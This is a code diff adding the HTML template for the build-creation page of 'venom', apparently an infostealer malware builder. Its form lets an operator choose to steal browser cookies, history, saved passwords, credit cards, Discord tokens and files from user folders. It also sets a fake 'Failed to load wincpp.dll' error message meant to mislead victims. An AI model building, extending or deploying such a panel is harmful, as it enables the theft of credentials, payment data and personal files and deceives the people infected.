@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    {% include "parts/head.html" %}
+    <title>venom | {{ get("title.build") }}</title>
+    <link href="/css/create.css" rel="stylesheet">
+  </head>
+  <body>
+    <form action="/build/create" method="POST" class="dark-box" x-data="{files: false, error: false}">
+      <h1>{{ get("create.title") }}</h1>
+      <h3>{{ get("create.desc") }}</h3>
+      <div class="general">
+        <label>
+          <div>
+            <i class='bx bxs-rename' ></i>
+            <p>{{ get("create.name") }}</p>
+          </div>
+          <input class="dark-input" 
+                 type="text" 
+                 name="name"
+                 value="Venom Build">
+        </label>
+      </div>
+      <table class="dark-table">
+        <tr>
+          <th>{{ get("create.col1") }}</th>
+          <th>{{ get("create.col2") }}</th>
+          <th>{{ get("create.col3") }}</th>
+        </tr>
+        <tr>
+          <td><input type="checkbox" checked="checked" name="cookie"></td>
+          <td><i class='bx bxs-cookie'></i> {{ get("create.cookie.name") }}</td>
+          <td>{{ get("create.cookie.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input type="checkbox" checked="checked" name="history"></td>
+          <td><i class='bx bx-history' ></i> {{ get("create.history.name") }}</td>
+          <td>{{ get("create.history.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input type="checkbox" checked="checked" name="password"></td>
+          <td><i class='bx bxs-key' ></i> {{ get("create.password.name") }}</td>
+          <td>{{ get("create.password.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input type="checkbox" checked="checked" name="card"></td>
+          <td><i class='bx bxs-credit-card-alt' ></i> {{ get("create.card.name") }}</td>
+          <td>{{ get("create.card.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input type="checkbox" checked="checked" name="discord"></td>
+          <td><i class='bx bxl-discord-alt' ></i> {{ get("create.discord.name") }}</td>
+          <td>{{ get("create.discord.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input @change="files = $event.target.checked" type="checkbox" name="files"></td>
+          <td><i class='bx bxs-folder-open' ></i> {{ get("create.files.name") }}</td>
+          <td>{{ get("create.files.desc") }}</td>
+        </tr>
+        <tr>
+          <td><input @change="error = $event.target.checked" type="checkbox" name="error"></td>
+          <td><i class='bx bxs-comment-error' ></i> {{ get("create.error.name") }}</td>
+          <td>{{ get("create.error.desc") }}</td>
+        </tr>
+      </table>
+
+      <div class="settings" x-show="files">
+        <label>
+          <div>
+            <i class='bx bxs-folder-open' ></i>
+            <p>{{ get("create.files.dirs") }}</p>
+          </div>
+          <input class="dark-input"
+                 type="text" 
+                 name="files_dirs"
+                 value="C:/Users/%USERNAME%,C:/Program Files/Important">
+        </label>
+        <label>
+          <div>
+            <i class='bx bxs-file-find' ></i>
+            <p>{{ get("create.files.exts") }}</p>
+          </div>
+          <input class="dark-input"
+                 type="text" 
+                 name="files_exts"
+                 value="txt,pdf,docx,zip,xlsx,rar">
+        </label>
+        <label>
+          <div>
+            <i class='bx bx-reflect-horizontal' ></i>
+            <p>{{ get("create.files.max") }} (MB)</p>
+          </div>
+         <input class="dark-input"
+                type="number"
+                name="files_max"
+                max="5120"
+                min="1"
+                value="10">
+        </label>
+      </div>
+      <div class="settings" x-show="error">
+        <label>
+          <div>
+            <i class='bx bxs-message-alt-x' ></i>
+            <p>{{ get("create.error.title") }}</p>
+          </div>
+          <input class="dark-input"
+                 type="text" 
+                 name="error_title"
+                 value="Failed to load wincpp.dll"
+        </label>
+        <label>
+          <div>
+            <i class='bx bxs-message-alt-x' ></i>
+            <p>{{ get("create.error.msg") }}</p>
+          </div>
+          <input class="dark-input"
+                 type="text" 
+                 name="error_msg"
+                 value="Program failed while loading Windows C++ Native libraries, please install Visiual Studio to download these libraries. (0xff280000)"
+        </label>
+      </div>
+      <button type="submit">
+        <i class='bx bx-check' ></i>
+        <p>{{ get("create.btn" )}}</p>
+      </button>
+    </form>
+  </body>
+</html>
